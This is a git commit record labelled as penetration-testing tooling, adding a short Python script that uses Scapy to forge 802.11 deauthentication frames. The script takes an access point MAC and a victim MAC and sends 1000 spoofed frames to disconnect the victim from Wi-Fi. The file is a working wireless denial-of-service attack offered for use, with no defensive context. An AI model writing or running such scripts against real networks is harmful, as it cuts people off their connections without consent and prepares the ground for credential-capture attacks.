3ffa067ffe07900a0e10085a850f52655cb7ec0e
zhangzfmail <zhangzfmail@gmail.com>
2016-08-01 11:14:38 -0400

    Linux Penetration Testing Tools

---
+++ Linux/Attack/WDeauth.py
@@ -0,0 +1,13 @@
+##############################################################
+#         Wireless Deauthentication Based on Scapy           #
+##############################################################
+from scapy.all import *
+import sys
+
+interface = "wlan0"
+BSSID = raw_input("Enter the MAC of AP: ")
+victim_mac = raw_input("Enter the MAC of Victim: ")
+
+frame= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
+
+sendp(frame,iface=interface, count= 1000, inter= .1)
